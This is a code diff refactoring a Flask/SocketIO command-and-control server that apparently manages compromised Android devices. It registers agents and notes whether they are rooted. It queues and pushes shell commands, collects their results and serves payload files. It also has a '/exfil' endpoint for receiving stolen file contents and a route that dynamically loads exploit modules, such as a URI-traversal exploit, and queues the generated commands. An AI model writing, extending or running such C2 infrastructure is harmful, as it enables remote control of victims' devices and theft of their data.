@@ -13,8 +13,8 @@ CORS(app)
 socketio = SocketIO(app, cors_allowed_origins="*")
 
 # In-memory command queue for demo (replace with DB in production)
-device_commands = {}
-device_outputs = {}
+command_queue = {}
+result_store = {}
 connected_agents = {}
 agent_sockets = {}
 
@@ -33,20 +33,21 @@ def dashboard():
     return render_template("index.html")
 
 # === Agent Registration ===
+def register_device(device_id, meta):
+    connected_agents[device_id] = {
+        "manufacturer": meta.get("manufacturer", "unknown"),
+        "model": meta.get("model", "unknown"),
+        "rooted": meta.get("rooted", "unknown"),
+        "last_seen": time.time()
+    }
+
 @app.route("/register", methods=["POST"])
 def register():
     data = request.json
     device_id = data.get("device_id")
     token = register_token(device_id)
-    info = {
-        "manufacturer": data.get("manufacturer", "unknown"),
-        "model": data.get("model", "unknown"),
-        "rooted": data.get("rooted", "unknown"),
-        "last_seen": time.time()
-    }
-    connected_agents[device_id] = info
-    device_commands[device_id] = "id"
-    print(f"[+] Registered Agent: {device_id} {info}")
+    register_device(device_id, data)
+    print(f"[+] Registered Agent: {device_id} {connected_agents[device_id]}")
     return jsonify({"status": "registered", "token": token})
 
 # === Token Management ===
@@ -75,13 +76,36 @@ def list_agents():
     return jsonify(agents)
 
 # === Poll-based C2 commands ===
-@app.route("/get_command/<device_id>", methods=["GET"])
-def get_command(device_id):
-    cmd = device_commands.get(device_id, "")
-    connected_agents[device_id]["last_seen"] = time.time()
-    print(f"[>] Sending command to {device_id}: {cmd}")
-    return jsonify({"cmd": cmd})
+@app.route("/api/send_command", methods=["POST"])
+def send_command_to_agent():
+    data = request.json
+    device_id = data["device_id"]
+    command = data["command"]
+    args = data["args"]
+    command_queue[device_id] = (command, args)
+    return jsonify({"status": "queued"})
 
+@app.route("/get_command/<device_id>", methods=["GET"])
+def get_command_for_agent(device_id):
+    if device_id in command_queue:
+        command, args = command_queue.pop(device_id)
+        return jsonify({"command": command, "args": args})
+    return jsonify({"command": None})
+
+@app.route("/api/submit_result", methods=["POST"])
+def receive_result():
+    data = request.json
+    device_id = data["device_id"]
+    result = data["result"]
+    # Save result for later retrieval or print/log
+    result_store[device_id] = result
+    return jsonify({"status": "received"})
+
+@app.route("/api/get_result/<device_id>")
+def get_result(device_id):
+    return jsonify({"result": result_store.get(device_id)})
+
+ # === Manual Output & Command Endpoint (for debugging) ===
 @app.route("/post_output", methods=["POST"])
 def post_output():
     data = request.json
@@ -101,26 +125,30 @@ def set_command():
     print(f"[!] Command for {device_id} set to: {command}")
     return jsonify({"status": "command set"})
 
-# === File exfil endpoint ===
+# === File Exfiltration ===
 @app.route("/exfil", methods=["POST"])
 def receive_file():
     content = request.data.decode()
     print(f"\n[EXFIL] Received file data:\n{content}\n")
     return jsonify({"status": "received"})
 
-# === Exploits (e.g., URI Traversal) ===
-@app.route("/exploit/uri_traversal", methods=["POST"])
-def uri_traversal():
-    data = request.json
-    package = data.get("package")
-    component = data.get("component") 
-    from modules import exploit_uri_traversal
-    command = exploit_uri_traversal.generate_command(package, component)
-    device_id = data.get("device_id")
-    device_commands[device_id] = command
-    return jsonify({"status": "queued", "command": command})
+# === Dynamic Exploit Module Execution ===
+@app.route("/exploit/<module_name>", methods=["POST"])
+def generic_exploit(module_name):
+    try:
+        data = request.json
+        device_id = data.get("device_id")
+        package = data.get("package")
+        component = data.get("component") 
+        module = __import__(f"modules.{module_name}", fromlist=["generate_command"])
+        command = module.generate_command(package, component)
+        device_id = data.get("device_id")
+        command_queue[device_id] = (command , {})
+        return jsonify({"status": "queued", "command": command})
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
 
-# === Payload Downloader ===
+# === Payload Serving ===
 @app.route("/payloads/<filename>", methods=["GET"])
 def get_payload(filename):
     payload_path = os.path.join("payloads", filename)
@@ -128,7 +156,7 @@ def get_payload(filename):
         return {"error": "File not found"}, 404
     return send_file(payload_path, mimetype="application/octet-stream")
 
-# === File Upload to Server ===
+# === File Upload Support to Server ===
 @app.route("/upload", methods=["POST"])
 def upload():
     file = request.files["file"]
@@ -146,34 +174,33 @@ def on_disconnect():
     # Optional: cleanup logic or print info
     print(f"[!] A client disconnected")
 
-@socketio.on('command_result')
-def on_command_result(data):
-    print(f"[<] Result: {data}")
-
 @socketio.on('register')
 def register_agent(data):
     device_id = data.get("device_id")
-    manufacturer = data.get("manufacturer", "Unknown")
-    is_root = data.get("rooted", False)
-    connected_agents[device_id] = {
-        "manufacturer": manufacturer,
-        "model": data.get("model", "Unknown"),
-        "rooted": is_root,
-        "last_seen": time.time()
-    }
+    register_device(device_id, data)
     agent_sockets[device_id] = request.sid
     emit('agent_list', connected_agents, broadcast=True)
+    print(f"[+] WebSocket Agent registered: {device_id}")
+
+@socketio.on('command_result')
+def on_command_result(data):
+    device_id = data.get("device_id")
+    result = data.get("result")
+    result_store[device_id] = result
+    print(f"[<] WebSocket Result from {device_id}:\n{result}")
 
 @socketio.on('send_command')
 def send_command(data):
     device_id = data.get("device_id")
     command = data.get("command")
+    args = data.get("args", {})
     if device_id and command:
-        device_commands[device_id] = command
+        command_queue[device_id] = command
         sid = agent_sockets.get(device_id)
         if sid:
-            emit('command', {'cmd': command}, to=sid)
+            emit('command', {'cmd': command, 'args': args}, to=sid)
         print(f"[>] Sent to {device_id}: {command}")
 
+# === Start Server ===
 if __name__ == "__main__":
     socketio.run(app, host="0.0.0.0", port=5000)
